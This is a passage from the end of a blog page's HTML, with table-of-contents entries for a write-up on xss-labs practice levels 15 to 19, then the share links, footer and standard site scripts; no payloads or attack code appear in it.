href="#ng-include%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.16.0.1.</span> <span class="toc-text">ng-include相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-11"><span class="toc-number">1.16.0.2.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-11"><span class="toc-number">1.16.0.3.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-16"><span class="toc-number">1.17.</span> <span class="toc-text">level 16</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-12"><span class="toc-number">1.17.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-12"><span class="toc-number">1.17.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-17"><span class="toc-number">1.18.</span> <span class="toc-text">level 17</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-13"><span class="toc-number">1.18.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-13"><span class="toc-number">1.18.0.2.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-18"><span class="toc-number">1.19.</span> <span class="toc-text">level 18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-19"><span class="toc-number">1.20.</span> <span class="toc-text">level 19</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022
    n3ym4r
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/n3ym4r">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
